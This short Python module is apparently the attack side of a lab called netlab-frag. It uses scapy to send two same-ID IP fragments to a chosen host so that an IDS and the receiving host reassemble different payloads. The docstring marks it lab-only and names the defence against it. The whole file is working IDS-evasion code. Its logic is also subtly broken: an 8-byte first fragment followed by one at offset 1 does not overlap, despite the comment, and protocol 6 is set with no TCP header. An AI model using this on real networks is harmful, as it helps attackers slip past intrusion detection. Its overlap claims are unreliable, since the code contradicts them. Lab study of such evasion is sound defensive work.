# SPDX-License-Identifier: MIT
# Copyright (c) 2026 Chris <goabonga@pm.me>

"""Attack side of netlab-frag: overlapping IP fragments to evade an IDS. LAB ONLY.

Sends two fragments of one IP datagram that overlap, so an IDS reassembling
first-wins sees a benign payload while the host reassembling last-wins sees the
real one. Full reassembly / overlap normalization (see reassembly.py) defeats it.
"""

from __future__ import annotations

import argparse

from netlab_core import verdict
from netlab_core.sniffing import load_scapy


def run(args: argparse.Namespace) -> int:
    s = load_scapy()
    ipid = 0xABCD
    # fragment 1: offset 0, "more fragments" set
    f1 = s.IP(dst=args.dst, id=ipid, frag=0, flags="MF", proto=6) / s.Raw(b"AAAAAAAA")
    # fragment 2: overlaps at offset 1 (8 bytes in), last fragment
    f2 = s.IP(dst=args.dst, id=ipid, frag=1, flags=0, proto=6) / s.Raw(b"BBBBBBBB")
    print(f"[*] sending overlapping fragments (id {ipid:#x}) to {args.dst}")
    s.send([f1, f2], verbose=0)
    verdict("ALERT", "overlapping fragments sent -> IDS/host may disagree")
    return 0
